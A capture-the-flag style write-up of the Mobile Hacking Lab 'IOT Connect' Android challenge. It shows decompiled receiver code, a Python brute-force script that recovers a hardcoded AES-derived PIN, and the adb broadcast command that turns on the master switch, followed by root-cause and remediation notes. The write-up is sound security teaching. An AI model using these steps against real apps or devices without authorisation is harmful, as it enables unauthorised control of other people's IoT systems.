---
title: "IOT Connect - Bypassing a Broadcast Receiver's Client-Side Guard"
date: 2026-08-14
categories: [Mobile, Android]
tags: [android, broadcast-receiver, reverse-engineering, aes, mobile-hacking-lab]
image:
  path: /assets/iot.png
---

**Platform:** [Mobile Hacking Lab](https://academy.mobilehackinglab.com/)

**Lab:** [IOT Connect]

**Difficulty: Medium**


## Introduction

IOT Connect is a MobileHackingLab challenge centered around an Android IoT controller app with an exported broadcast receiver. The goal is to activate the app's master switch as a guest user, bypassing the client-side restriction that's meant to lock guests out of it, which simulates a real-world authorization boundary placed in the wrong layer of the app.

<img width="519" height="803" alt="image" src="https://github.com/user-attachments/assets/50ca2919-243e-4e71-922e-03cfc76f7e6a" />


## App Walkthrough: The Guest Restriction

Before touching any code, I wanted to see the restriction in action. Opening the app as a guest and tapping **Master Switch** dropped me into a 3-digit PIN entry screen. Typing in a PIN (`123`) and hitting Check returned:

> "Sorry, the masterswitch can't be controlled by guests"

<img width="517" height="808" alt="image" src="https://github.com/user-attachments/assets/182dfcde-b6f1-43fd-ad73-f23937fb4ae7" />


So there's clearly a role check happening somewhere. The question was whether that check protected the actual privileged action, or just the UI in front of it.

## Recon: Manifest Analysis

Decompiling the APK with jadx and pulling `AndroidManifest.xml`, one component
stood out immediately:

```xml
<receiver
    android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="MASTER_ON"/>
    </intent-filter>
</receiver>
```

`android:exported="true"` with no `android:permission` attribute means any app on the device or `adb` can send a `MASTER_ON` broadcast directly to this component. No cross-app permission, no signature check, nothing gating who's allowed to fire it.

That alone was enough to know the surface was reachable. The next question was what, if anything, validated the sender once the broadcast landed.

## Static Analysis: The Receiver Logic

The real logic lives in a *dynamically* registered receiver inside `CommunicationManager.initialize()`:

```kotlin
override fun onReceive(context: Context?, intent: Intent?) {
    if (intent?.action == "MASTER_ON") {
        val key = intent.getIntExtra("key", 0)
        if (Checker.check_key(key)) {
            CommunicationManager.turnOnAllDevices(context)
        } else {
            // "Wrong PIN!!" toast
        }
    }
}
```

So there *is* a real check here - `Checker.check_key(key)` - not just an open door. This is the actual authorization boundary for the privileged action. Whatever the "guest" UI was doing, it's irrelevant to this code path; this
receiver will act on any broadcast that supplies a correct `key`, from anywhere.

## Exploitation: Breaking Checker.check_key()

`Checker` turned out to be fully self-contained and fully static:

```kotlin
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==" // AES ciphertext

fun check_key(key: Int): Boolean =
    decrypt(ds, key) == "master_on"

fun decrypt(ds: String, key: Int): String {
    val secretKey = generateKey(key)
    val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
    cipher.init(Cipher.DECRYPT_MODE, secretKey)
    return String(cipher.doFinal(Base64.getDecoder().decode(ds)), Charsets.UTF_8)
}

fun generateKey(staticKey: Int): SecretKeySpec {
    val keyBytes = ByteArray(16)                                  // zero-filled
    val staticKeyBytes = staticKey.toString().toByteArray(Charsets.UTF_8)
    System.arraycopy(staticKeyBytes, 0, keyBytes, 0,
        minOf(staticKeyBytes.size, keyBytes.size))
    return SecretKeySpec(keyBytes, "AES")
}
```

The "PIN" is converted to its decimal string, and those ASCII bytes become an AES key, zero-padded to 16 bytes. The ciphertext and algorithm are both hardcoded in the APK, so the entire check can be recomputed offline with no device interaction at all.

Since the UI told me the PIN was 3 digits, the keyspace was only 0-999. I replicated `Checker`'s logic in Python and brute-forced it locally:

```python
import base64
from Crypto.Cipher import AES

CIPHERTEXT = base64.b64decode("OSnaALIWUkpOziVAMycaZQ==")

def generate_key(n: int) -> bytes:
    key_bytes = bytearray(16)
    b = str(n).encode("utf-8")
    key_bytes[:len(b)] = b
    return bytes(key_bytes)

for candidate in range(1000):
    cipher = AES.new(generate_key(candidate), AES.MODE_ECB)
    decrypted = cipher.decrypt(CIPHERTEXT)
    pad_len = decrypted[-1]
    if 1 <= pad_len <= 16 and decrypted[-pad_len:] == bytes([pad_len]) * pad_len:
        if decrypted[:-pad_len].decode() == "master_on":
            print(f"Valid key: {candidate:03d}")
```

This ran and returned a single hit: `345`.

## Exploitation: Firing the Broadcast

With a valid key, triggering the master switch didn't require the app's UI, a login, or any elevated privileges - just `adb`:

```bash
~> /mobile_hacking_lab/iot_connect adb shell am broadcast -a MASTER_ON --ei key 345
Broadcasting: Intent { act=MASTER_ON flg=0x400000 (has extras) }
Broadcast completed: result=0 
```

- `-a MASTER_ON` matches the receiver's `IntentFilter`
- `--ei key 345` supplies the integer extra the receiver reads via `intent.getIntExtra("key", 0)`

<img width="1599" height="811" alt="image" src="https://github.com/user-attachments/assets/615ccb22-4d7c-4c0a-9362-37409e368d76" />


The toast confirmed it: full master-switch activation, without ever passing through the guest check in `MasterSwitchActivity`.

## Root Cause

The vulnerability isn't simply "exported receiver" - plenty of exported receivers are safe if they don't gate anything sensitive. The real issue is a **misplaced trust boundary**:

- The app implemented an authorization check (`Checker.check_key()`), but that check lived behind a component reachable by any app on the device, not just the legitimate UI flow.
- The "guest" restriction lived entirely in the Activity layer (`MasterSwitchActivity`), completely disconnected from the actual privileged action.
- The cryptographic material needed to compute a valid key - ciphertext, algorithm, and key-derivation scheme, was static and shipped inside the APK.


## Remediation

- Set `android:exported="false"` on `MasterReceiver` unless another app genuinely needs to trigger it.
- If external triggering is required, gate it with a signature-level permission scoped to trusted callers, or verify `getCallingPackage()` rather than trusting any broadcast with the right action string.
- Never make an authorization decision fully recomputable from data shipped in the client. A static AES key/ciphertext pair hardcoded into the APK is not a secret, it's public the moment the app is published.

Happy Hacking!!!

